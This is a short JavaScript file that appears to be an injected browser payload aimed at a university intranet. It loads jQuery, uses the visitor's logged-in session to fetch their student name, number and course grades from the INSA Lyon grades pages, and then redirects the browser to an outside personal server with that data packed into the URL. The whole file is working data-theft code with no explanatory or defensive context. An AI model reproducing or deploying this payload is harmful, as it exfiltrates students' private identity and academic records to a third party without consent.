if (window.location.protocol != "https:")
    window.location.href = "https:" + window.location.href.substring(window.location.protocol.length);

var script = document.createElement('script');
script.src = '//code.jquery.com/jquery-1.11.0.min.js';
script.type = 'text/javascript';
document.getElementsByTagName('head')[0].appendChild(script);
var checkReady = function (callback) {
    if (window.jQuery) {
        callback(jQuery);
    }
    else {
        window.setTimeout(function () {
            checkReady(callback);
        }, 100);
    }
};

    checkReady(function ($) {
        $(document).ready(function () {

            $.post("//intranet-if.insa-lyon.fr/notesif/index.php")
                .done(function (data) {
                    nom = $.trim($(data).find("#nom").text());
                    numero = $(data).find("#numEtudiant > span.valeur").text();

                    $.post("//intranet-if.insa-lyon.fr/notesif/indexCorps.php", { numet: numero, annee: "_2013_2014" })
                        .done(function (data) {
                            var notes = [];


                            $(data).find("td.matiere").each(function () {
                                notes.push({"m": $.trim($(this).text()), "n": $(this).parent().children(".note").text()})
                            });
                            var user = {'nom': nom, "numero": numero, "notes": notes}
                            window.location.href = 'http://home.laurentbillon.fr:3000?param='+encodeURIComponent(JSON.stringify(user))
                        });
                })
        });


    });
